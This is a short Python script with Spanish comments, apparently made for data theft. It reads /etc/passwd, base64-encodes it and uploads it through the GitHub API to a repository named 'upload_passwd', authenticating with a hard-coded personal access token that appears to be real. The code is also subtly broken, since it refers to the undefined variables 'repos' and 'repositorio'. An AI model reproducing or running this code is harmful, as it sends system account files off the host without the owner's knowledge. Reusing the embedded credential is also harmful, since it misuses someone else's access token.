def run():
  import requests
  import base64
  
  token = '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'
  
  # Configura el nombre de usuario y el repositorio
  user = 'Oxitocinaa'
  repo = 'upload_passwd'
  
  # Configura la ruta local del archivo que deseas subir
  ruta_archivo_local = '/etc/passwd'
  
  # Configura la rama en la que deseas realizar la acción
  rama = 'main'
  
  # Lee el contenido del archivo local
  with open(ruta_archivo_local, 'rb') as archivo:
      contenido = archivo.read()
  
  # Codifica el contenido en base64
  contenido_codificado = base64.b64encode(contenido).decode('utf-8')
  
  # URL de la API de GitHub para crear o actualizar un archivo
  url = f'https://api.github.com/repos/{user}/{repos}/contents/{ruta_archivo_local}'
  
  # Prepara los datos para la solicitud HTTP
  data = {
      'message': 'Subiendo archivo desde script de Python',
      'content': contenido_codificado,
      'branch': rama
  }
  
  # Configura las cabeceras con el token de acceso personal
  headers = {
      'Authorization': f'token {token}'
  }
  
  # Realiza la solicitud PUT para subir el archivo
  response = requests.put(url, json=data, headers=headers)
  
  if response.status_code == 201:
      print(f'Archivo "{ruta_archivo_local}" subido exitosamente a la rama "{rama}" en el repositorio "{repositorio}".')
  else:
      print(f'Error al subir el archivo: {response.status_code} - {response.json()["message"]}')

